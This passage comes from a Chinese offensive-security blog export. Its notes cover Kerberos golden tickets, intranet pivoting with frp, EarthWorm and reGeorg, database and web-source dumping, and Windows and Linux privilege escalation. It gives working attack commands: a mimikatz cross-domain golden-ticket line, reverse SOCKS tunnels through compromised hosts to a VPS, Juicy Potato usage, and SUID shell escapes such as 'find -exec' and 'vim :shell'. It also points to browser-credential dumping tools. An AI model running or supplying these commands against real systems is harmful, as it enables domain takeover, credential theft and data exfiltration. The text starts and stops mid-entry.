<h3 id="EnhancedGolden-Tickets"><a href="#EnhancedGolden-Tickets" class="headerlink" title="EnhancedGolden Tickets"></a>EnhancedGolden Tickets</h3><p>参考：<a href="https://www.freebuf.com/articles/system/197160.html">https://www.freebuf.com/articles/system/197160.html</a></p>
<p>通过域内主机在迁移时<code>LDAP库</code>中的<code>SIDHistory</code>属性中保存的<code>上一个域</code>的<code>SID值</code>制作可以跨域的金票。</p>
<p>如果知道根域的SID那么就可以<code>通过子域</code>的KRBTGT的<code>HASH</code>值，使用mimikatz创建具有 EnterpriseAdmins组权限（域林中的最高权限）的票据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::golden &#x2F;admin:administrator &#x2F;domain:news.yunying.lab &#x2F;sid:XXX &#x2F;sids:XXX &#x2F;krbtgt:XXX &#x2F;startoffset:0 &#x2F;endin:600 &#x2F;renewmax:10080 &#x2F;ptt</span><br></pre></td></tr></table></figure>

<p>Startoffset和endin分别代表偏移量和长度，renewmax表示生成的票据的最长时间</p>
<p>这使用的是子域krbtgt的 hash，根域的不知道。</p>
<p>参考：渗透攻击红队公众号</p>
<p><a href="https://cloud.tencent.com/developer/article/1653877">内网渗透（四） | 票据传递攻击 - 云+社区 - 腾讯云 (tencent.com)</a></p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网横向渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>内网知识学习</title>
    <url>/2022/01/23/%E5%86%85%E7%BD%91%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="ntlm协议"><a href="#ntlm协议" class="headerlink" title="ntlm协议"></a>ntlm协议</h1><p><a href="https://www.istt.org.cn/NewsDetail/2031875.html">Windows认证原理 网络认证(进阶篇)-江苏智慧安全可信技术研究院 (istt.org.cn)</a></p>
<h1 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h1><p>Kerberos是一种由MIT提出的一种计算机网络授权协议，旨在通过使用加密技术为客户端/服务端应用程序提供强大的认证服务。</p>
<p>Kerberos 主要是用在<code>域环境下的身份认证协议</code>。</p>
<p><img src="/2022/01/23/%E5%86%85%E7%BD%91%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/image-20220124122003434.png" alt="image-20220124122003434"></p>
<p>client              ——       TGT            ——               <strong>KDC</strong>，密钥分发中心(<strong>AS</strong>，身份验证服务,<strong>TGS</strong>，票据授权服务)</p>
<p>|</p>
<p>TGS(ticket )</p>
<p>|</p>
<p>server </p>
<p>tgt   黄金票据</p>
<p>tgs  白银票据</p>
<p>EnhancedGolden <strong>Tickets</strong>    增强版（子域打域控）</p>
<p>（权限维持）</p>
<p>参考：</p>
<p><a href="https://mp.weixin.qq.com/s/MWN5darSef0OqiT6rLk9nA">https://mp.weixin.qq.com/s/MWN5darSef0OqiT6rLk9nA</a></p>
<p><a href="https://mp.weixin.qq.com/s/5u2dyu1wVji8d1IxLb11DA">https://mp.weixin.qq.com/s/5u2dyu1wVji8d1IxLb11DA</a></p>
<p><a href="https://www.istt.org.cn/NewsDetail/2031879.html">Windows认证原理 Kerberos认证-江苏智慧安全可信技术研究院 (istt.org.cn)</a></p>
<p>​    </p>
<h1 id="解密浏览器密码工具"><a href="#解密浏览器密码工具" class="headerlink" title="解密浏览器密码工具"></a>解密浏览器密码工具</h1><p>（有杀软）本地解chrome数据库方法：<a href="https://github.com/moonD4rk/HackBrowserData/releases/tag/v0.3.7">https://github.com/moonD4rk/HackBrowserData/releases/tag/v0.3.7</a> </p>
<p>（无杀软） 直接用<a href="https://github.com/moonD4rk/HackBrowserData">hack-browser-data.exe</a>导出cookie</p>
<p>参考：</p>
<p>dozerctf2021域渗透：<a href="https://www.yuque.com/w0rkmn/lnpppa/mdie6g#f755069b">https://www.yuque.com/w0rkmn/lnpppa/mdie6g#f755069b</a></p>
<h1 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h1><p> 活动目录是一种目录服务：活动目录通过域控制器接受查询请求，查询活动目录数据库把域对象名字解析为对象记录</p>
<p>​    <code>活动目录用户</code>通过<code>LDAP协议</code>（一种进入目录服务的协议）向活动目录服务器<code>发送请求</code>，为了定位提供查询服务的域控制器就需要借助于DNS。</p>
<p>​    活动目录使用<code>DNS服务器</code>作为<code>定位服务器</code>，把域控制器解析为IP地址。活动目录要发挥作用，离不开DNS。</p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网知识学习</tag>
      </tags>
  </entry>
  <entry>
    <title>内网穿透</title>
    <url>/2020/12/22/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    <content><![CDATA[<h2 id="frp篇"><a href="#frp篇" class="headerlink" title="frp篇"></a>frp篇</h2><h3 id="web端口转发-rdp转发"><a href="#web端口转发-rdp转发" class="headerlink" title="web端口转发+rdp转发"></a>web端口转发+rdp转发</h3><p>ubantu 桥接模式 ip:192.168.1.102  (模拟公网server)</p>
<p>win7     NAT模式   ip:192.168.119.129(模拟内网)</p>
<p> 下载对应版本<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p>
<hr>
<blockquote>
<p>ubantu  </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp&#x2F;releases&#x2F;download&#x2F;v0.37.0&#x2F;frp_0.37.0_linux_amd64.tar.gz</span><br><span class="line">tar -zxvf frp_0.37.0_linux_amd64.tar.gz</span><br><span class="line">cd frp_0.37.0_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#frps.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 6000      #frp服务器端口</span><br><span class="line">vhost_http_port&#x3D; 8080  #设定的http访问端口  （一定要写）</span><br></pre></td></tr></table></figure>

<ul>
<li>启动：./frps -c frps.ini</li>
</ul>
<hr>
<span id="more"></span>

<blockquote>
<p>win7   </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#frpc.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.1.102   #ip</span><br><span class="line">server_port &#x3D; 6000            #本机绑定的端口</span><br><span class="line"></span><br><span class="line">[web]</span><br><span class="line">type &#x3D; http    </span><br><span class="line">local_ip &#x3D; 192.168.119.129</span><br><span class="line">local_port &#x3D; 80                #要映射的本地端口</span><br><span class="line">custom_domains &#x3D; 192.168.1.102 #或者域名     </span><br><span class="line">remote_port &#x3D; 8080    </span><br><span class="line">http_user &#x3D; admin               #安全认证</span><br><span class="line">http_pwd &#x3D; admin  </span><br><span class="line"></span><br><span class="line">[rdp]</span><br><span class="line">type&#x3D;tcp</span><br><span class="line">local_ip &#x3D; 192.168.119.129      #远程桌面映射3389端口</span><br><span class="line">local_port &#x3D; 3389</span><br><span class="line">remote_port &#x3D; 3389</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>启动 frpc -c frpc.ini</li>
</ul>
<hr>
<h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><ul>
<li>vps</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#frps.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 6000      </span><br></pre></td></tr></table></figure>

<p>​        </p>
<ul>
<li>跳板机</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#frpc.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.1.102   #vps-ip</span><br><span class="line">server_port &#x3D; 6000            #本机绑定的端口</span><br><span class="line"></span><br><span class="line">[plugin_socks]</span><br><span class="line">tpye &#x3D; tcp</span><br><span class="line">local_port &#x3D; 11111  #一定写本地端口</span><br><span class="line">remote_port &#x3D;10010  #带出到外网vps端口</span><br><span class="line">plugin &#x3D; socks5</span><br></pre></td></tr></table></figure>

<ul>
<li>攻击机</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">直接绑定vps-ip和remote_port</span><br></pre></td></tr></table></figure>





<h2 id="portfwd"><a href="#portfwd" class="headerlink" title="portfwd"></a>portfwd</h2><blockquote>
<p>kali</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">portfwd add ‐l 33333 ‐r 192.168.1.102 ‐p 3389      将192.168.1.102的3389端口转发到kali 33333端口</span><br></pre></td></tr></table></figure>

<p>在meterpreter会话口将端口转发出来，</p>
<p><a href="https://blog.csdn.net/ws13129/article/details/94395905">参考</a></p>
<hr>
<p>下面测试代理的环境：</p>
<p>本地主机：192.168.1.101</p>
<p>kali ：192.168.1.103 （桥接）</p>
<p>内网入口双网卡：192.168.1.102（桥接），连接内网192.168.52.0/24（vmnet1） （内网入口）</p>
<p>内网服务器：192.168.52.138</p>
<p>能否代理成功就看本机能否访问<a href="http://192.168.52.138/">http://192.168.52.138/</a></p>
<hr>
<p>工具：</p>
<p>proxifier:<a href="https://www.filehorse.com/download-proxifier/">https://www.filehorse.com/download-proxifier/</a>    or <a href="https://proxifier.soft32.com/">https://proxifier.soft32.com/</a></p>
<p>EarthWorm，停止更新</p>
<p>reGeorg <a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p>
<p>Neo-reGeorg <a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p>
<h2 id="earthworm"><a href="#earthworm" class="headerlink" title="earthworm"></a>earthworm</h2><h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><blockquote>
<p>内网攻击机–&gt;失陷公网主机</p>
</blockquote>
<p>我们拿下的是一台公网机器shell，该机器有内网网卡，与内网相通。通过在失陷公网添加代理，对内网资产进行探测。</p>
<ul>
<li>失陷公网主机（跳板机）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;ew  -s  ssocksd  -l  10010       &#x2F;&#x2F;在10010端口开启socks代理，SOCK5</span><br></pre></td></tr></table></figure>



<ul>
<li>kali</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;proxychains.conf</span><br><span class="line"></span><br><span class="line">注释掉socks4，添加</span><br><span class="line"></span><br><span class="line">socks5  192.168.1.102  10010</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/22/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/ew1.png" alt="ew1"></p>
<ul>
<li>本机win利用proxifier添加ip 端口进行全局代理也可以</li>
</ul>
<p><img src="/2020/12/22/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/ew2.png" alt="ew2"></p>
<h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><blockquote>
<p>内网攻击机 -&gt; 自己的公网vps -&gt; 受陷内网</p>
</blockquote>
<p>场景就是我们通过某些服务直接拿下了内网一台机器，该机器只是通过映射某些端口对外网，能够提供相应服务。</p>
<p>我们需要通过socks5反向代理将流量带进内网，进行内网探测。</p>
<p>kali                             192.168.1.101</p>
<p>vps                              35.34.xx.xx</p>
<p>内网失陷主机             192.168.119.20</p>
<ul>
<li>内网失陷主机 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ew_for_win_32.exe -s rssocks -d 35.34.xx.xx -e 1024       反向代理连接公网服务器。</span><br></pre></td></tr></table></figure>



<ul>
<li>vps</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;ew_for_linux-s -rcsocks -l 1010 -e 1024</span><br><span class="line"></span><br><span class="line">监听1010等本机访问          监听1024端口，等内网反弹。</span><br></pre></td></tr></table></figure>



<ul>
<li>kali</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;proxychains.conf</span><br><span class="line"></span><br><span class="line">socks5 35.34.xx.xx 1010</span><br></pre></td></tr></table></figure>



<ul>
<li>or  本机windows</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;ew  -s  rssocks -d  35.34.xx.xx  -e 1024</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h2><p>tunnel.php多了<code>dl(&quot;php_sockets.dll&quot;);</code>这行代码。作用是加载socket这个模块，但dl自php 5.3起默认情况下处于禁用状态，所以php 5.3版本以下才可以使用tunnel.php。如果启用，则需配置php.ini(开启enable_dl ，安装php_sockets扩展客户端)。</p>
<p>window下这个靶机我是没有配置好。。。</p>
<p>本机：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -p 10010 -u http:&#x2F;&#x2F;192.168.1.102&#x2F;tunnel.php</span><br></pre></td></tr></table></figure>



<h2 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h2><p>人家魔改的,我的靶机还是报错，，，感觉这个还是有点限制的</p>
<p>本机：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python neoreg.py generate -k zzz</span><br><span class="line">python neoreg.py -k zzz -u http:&#x2F;&#x2F;192.168.1.102&#x2F;tunnel.php  -p 10010</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网穿透</tag>
      </tags>
  </entry>
  <entry>
    <title>工具安装记录</title>
    <url>/2021/12/29/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>[TOC]</p>
<span id="more"></span>

<h3 id="资产灯塔系统ARL安装使用"><a href="#资产灯塔系统ARL安装使用" class="headerlink" title="资产灯塔系统ARL安装使用"></a><a href="https://www.cnblogs.com/qtzd/p/install-ARL.html">资产灯塔系统ARL安装使用</a></h3><p>官方连接<a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></p>
<p>安装过程<a href="https://www.cnblogs.com/qtzd/p/14678853.html">https://www.cnblogs.com/qtzd/p/14678853.html</a></p>
<p>使用教程<a href="https://www.bilibili.com/video/BV1ba41167FR?p=23">https://www.bilibili.com/video/BV1ba41167FR?p=23</a></p>
<blockquote>
<p>使用流程</p>
</blockquote>
<ol>
<li>添加资产分组</li>
<li>添加策略（有很多功能）</li>
<li>添加监控任务（这时候可以选择策略）</li>
</ol>
<blockquote>
<p>升级</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;..&#x2F;..&#x2F;arl</span><br><span class="line"></span><br><span class="line">git pull </span><br><span class="line"></span><br><span class="line">cd &#x2F;..&#x2F;..&#x2F;arl&#x2F;docker</span><br><span class="line"></span><br><span class="line">docker-compose pull</span><br><span class="line"></span><br><span class="line">docker-compose up -d </span><br></pre></td></tr></table></figure>





<blockquote>
<p>忘记密码</p>
</blockquote>
<p>进入数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it arl_mongodb mongo -u admin -p admin</span><br></pre></td></tr></table></figure>

<p>下面执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; use arl</span><br><span class="line">switched to db arl</span><br><span class="line">&gt; db.user.drop()</span><br><span class="line">true</span><br><span class="line">&gt; db.user.insert(&#123;username: &#39;admin&#39;, password: hex_md5(&#39;arlsalt!@#&#39;+&#39;admin123&#39;)&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)</span><br><span class="line">&gt; exit</span><br><span class="line">bye</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">用admin&#x2F;admin123登陆</span><br></pre></td></tr></table></figure>





<h3 id="freenom-cloudflare"><a href="#freenom-cloudflare" class="headerlink" title="freenom+cloudflare"></a>freenom+cloudflare</h3><p>freenom:<a href="https://www.freenom.com/zh/index.html?lang=zh">https://www.freenom.com/zh/index.html?lang=zh</a></p>
<p><img src="/2021/12/29/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20220127170459840.png" alt="image-20220127170459840"></p>
<p>cloudflare:<a href="https://dash.cloudflare.com/">https://dash.cloudflare.com/</a></p>
<p><img src="/2021/12/29/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20220127170605260.png" alt="image-20220127170605260"></p>
<p><img src="/2021/12/29/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20220127170626202.png" alt="image-20220127170626202"></p>
<p><img src="/2021/12/29/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20220127171635729.png" alt="image-20220127171635729"></p>
<h3 id="Impacket"><a href="#Impacket" class="headerlink" title="[Impacket ]"></a>[Impacket ]</h3><p>介绍：<a href="https://www.cnblogs.com/backlion/p/10676339.html">https://www.cnblogs.com/backlion/p/10676339.html</a></p>
<p>安装方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;CoreSecurity&#x2F;impacket.git</span><br><span class="line"></span><br><span class="line">cd impacket&#x2F;</span><br><span class="line"></span><br><span class="line">python setup.py install</span><br><span class="line"></span><br><span class="line">cd impacket&#x2F;examples</span><br><span class="line">工具都在这个目录里impacket&#x2F;examples</span><br></pre></td></tr></table></figure>

<p>打内网里面很多py还是很方便的</p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><h3 id="vscodo-go-debug环境-失败"><a href="#vscodo-go-debug环境-失败" class="headerlink" title="vscodo go debug环境 失败"></a>vscodo go debug环境 失败</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">go env -w GO111MODULE&#x3D;auto</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/qq_43573718/article/details/119488777">(26条消息) VSCode安装go插件失败_编程猿哥的博客-CSDN博客</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具安装记录</tag>
      </tags>
  </entry>
  <entry>
    <title>基础web漏洞总结</title>
    <url>/2022/03/14/%E5%9F%BA%E7%A1%80web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h1><p><a href="https://www.shmilying.tk/categories/%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/">常见数据库注入 | (shmilying.tk)</a></p>
 <span id="more"></span>

<h3 id="常见基础绕过"><a href="#常见基础绕过" class="headerlink" title="常见基础绕过"></a>常见基础绕过</h3><h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><h3 id="收藏语句"><a href="#收藏语句" class="headerlink" title="收藏语句"></a>收藏语句</h3><h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><ol>
<li>判断前后端校验</li>
<li>判断黑白名单（可以上传1.xxxxx 测试）</li>
</ol>
<h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><h5 id="利用文件包含"><a href="#利用文件包含" class="headerlink" title="利用文件包含"></a>利用文件包含</h5><ul>
<li><p>图片马</p>
</li>
<li><p>包含session文件</p>
</li>
</ul>
<h5 id><a href="#" class="headerlink" title></a></h5><h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><h5 id="后缀绕过"><a href="#后缀绕过" class="headerlink" title="后缀绕过"></a>后缀绕过</h5><h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><p>参考：</p>
<p><a href="https://xz.aliyun.com/t/10459">https://xz.aliyun.com/t/10459</a></p>
<p><a href="https://xz.aliyun.com/t/10515">https://xz.aliyun.com/t/10515</a></p>
<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><ul>
<li>条件竞争</li>
</ul>
<h1 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h1><h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><hr>
<h1 id="网站源码备份"><a href="#网站源码备份" class="headerlink" title="网站源码备份"></a>网站源码备份</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">tar -zcvf ~&#x2F;html.tar.gz *</span><br></pre></td></tr></table></figure>





<h1 id="脱库"><a href="#脱库" class="headerlink" title="脱库"></a>脱库</h1><ul>
<li>mysql</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqldump -u root -p --all-databases &gt; ~&#x2F;backup.sql  # 备份所有数据库</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在mysql&#x2F;data&#x2F;  中文件</span><br></pre></td></tr></table></figure>

<ul>
<li>mssql 数据库</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backup database Test to disk&#x3D;&#39;D:&#x2F;Test.bak&#39;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msdbdata.mdf msdblog.ldf 两个文件 copy 一份</span><br></pre></td></tr></table></figure>

<ul>
<li>acccess数据库</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mdb格式直接下载</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>基础web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>提权</title>
    <url>/2022/01/16/%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="windows-提权"><a href="#windows-提权" class="headerlink" title="windows 提权"></a>windows 提权</h1><hr>
<h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p>汇总：<a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
<h5 id="提权辅助"><a href="#提权辅助" class="headerlink" title="提权辅助"></a>提权辅助</h5><p>systeminfo   查看补丁</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221104049104.png" alt="image-20220221104049104"></p>
<p><a href="https://i.hacking8.com/tiquan">https://i.hacking8.com/tiquan</a> 寻找提权漏洞，github下载，但提权exe需要经过免杀测试 </p>
<p><a href="https://github.com/Ascotbe/Kernelhub">Windows提权漏洞合集</a></p>
<span id="more"></span>

<h5 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h5><ol>
<li>该模块能够查询安装补丁</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use post&#x2F;windows&#x2F;gather&#x2F;enum_patches</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221103405151.png" alt="image-20220221103405151"></p>
<ol start="2">
<li>低权限用户的session，该模块用于快速识别系统中可能被利用的漏洞，进行提权</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester </span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221112230097.png" alt="image-20220221112230097"></p>
<p>根据显示可利用的模块，进行提权（感觉可以）</p>
<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221131823569.png" alt="image-20220221131823569"></p>
<h3 id="bypassUAC"><a href="#bypassUAC" class="headerlink" title="bypassUAC"></a>bypassUAC</h3><p>用户帐户控制 (UAC)  允许所有用户使用标准用户帐户登录到他们的计算机。 使用标准用户令牌启动的进程可能会使用授予标准用户的访问权限执行任务。借助 UAC，应用和任务将始终在非管理员帐户的安全上下文中运行，除非管理员专门授予管理员级别的访问系统权限。 UAC 可阻止自动安装未经授权的应用并防止意外更改系统设置。</p>
<p>总之来说就是绕过uac限制，运行某些程序，对c盘一些重要文件进行读取和写入，安装卸载程序等</p>
<p>适用于：</p>
<ul>
<li>Windows 10，Windows 11，Windows Server 2016 和更高版本</li>
</ul>
<h5 id="msf-1"><a href="#msf-1" class="headerlink" title="msf:"></a>msf:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221133213351.png" alt="image-20220221133213351"></p>
<p>参考：<a href="https://mp.weixin.qq.com/s/vowFqYxX_x0gu2-38TEGFA">https://mp.weixin.qq.com/s/vowFqYxX_x0gu2-38TEGFA</a></p>
<h5 id="dll注入"><a href="#dll注入" class="headerlink" title="dll注入"></a>dll注入</h5><h5 id="白名单进程"><a href="#白名单进程" class="headerlink" title="白名单进程"></a>白名单进程</h5><h3 id="土豆家族"><a href="#土豆家族" class="headerlink" title="土豆家族"></a>土豆家族</h3><p>Juicy Potato：<a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p>
<p>原理：</p>
<p>实际上就是利用MS16-075漏洞进行提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c &#123;8BC3F05E-D86B-11D0-A075-00C04FB68820&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220219151053814.png" alt="image-20220219151053814"></p>
<p>条件：</p>
<ol>
<li>用户权限：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果开启SeImpersonate权限，juicypotato的参数可以使用-t t</span><br><span class="line"></span><br><span class="line">如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u</span><br><span class="line"></span><br><span class="line">如果均开启，可以选择-t *</span><br><span class="line">如果均未开启，那么无法提权</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>RPC 135端口是否开启</li>
</ol>
<p>参考：</p>
<p><a href="https://mp.weixin.qq.com/s/66y_Pg2j9CNfxeErFczdSg">https://mp.weixin.qq.com/s/66y_Pg2j9CNfxeErFczdSg</a></p>
<p><a href="https://mp.weixin.qq.com/s/lmfM6VWM3YXj2vjalNerKw">https://mp.weixin.qq.com/s/lmfM6VWM3YXj2vjalNerKw</a></p>
<p><a href="https://blog.cfyqy.com/article/bde10ad7.html#more">https://blog.cfyqy.com/article/bde10ad7.html#more</a></p>
<h1 id="linux-提权"><a href="#linux-提权" class="headerlink" title="linux 提权"></a>linux 提权</h1><hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname -a               查询内核版本</span><br><span class="line">cat &#x2F;etc&#x2F;issue         查询发行版本</span><br></pre></td></tr></table></figure>



<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>脏牛</p>
<p>Linux Polkit 权限提升(CVE-2021-4034)</p>
<p>Linux kernel 本地提权漏洞 cve-2022-0847</p>
<p><a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04.1</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220307133812910.png" alt="image-20220307133812910"></p>
<h3 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h3><p>寻找root用户拥有的suid的文件。普通用户通过suid能够以文件拥有者身份允许该文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -user root -perm -4000-print2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -user root -perm -4000-exec ls -ldb &#123;&#125; \;</span><br><span class="line">参考谢公子  https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_36119192&#x2F;article&#x2F;details&#x2F;84872644</span><br></pre></td></tr></table></figure>

<p>可以利用提权的文件列表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap</span><br><span class="line">vim</span><br><span class="line">find</span><br><span class="line">bash</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">nano</span><br><span class="line">cp</span><br></pre></td></tr></table></figure>

<p>如果执行命令发现以上程序文件列表，即可提权，例如：发现 /usr/bin/find</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">touch aaa</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;find  aaa   -exec whoami \;</span><br></pre></td></tr></table></figure>

<p>vim</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim.tiny</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">:set shell&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>

<p>bash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure>

<p>less</p>
